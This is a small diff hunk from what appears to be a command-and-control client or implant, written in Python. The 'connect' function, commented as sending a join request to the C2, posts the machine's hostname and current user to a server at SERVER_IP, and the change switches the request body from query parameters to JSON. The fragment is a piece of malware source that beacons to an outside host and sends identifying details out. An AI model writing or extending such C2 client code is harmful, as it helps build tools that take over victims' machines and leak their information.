@@ -15,7 +15,7 @@ SLEEP_TIME = 3
 
 # function to send to server a join request to c2
 def connect():
-    r = rq.post(f"http://{SERVER_IP}/join", params={
+    r = rq.post(f"http://{SERVER_IP}/join", json={
         'hostname': get_hostname(),
         'user': get_whoami()
     }, timeout=REQUEST_TIMEOUT).json()
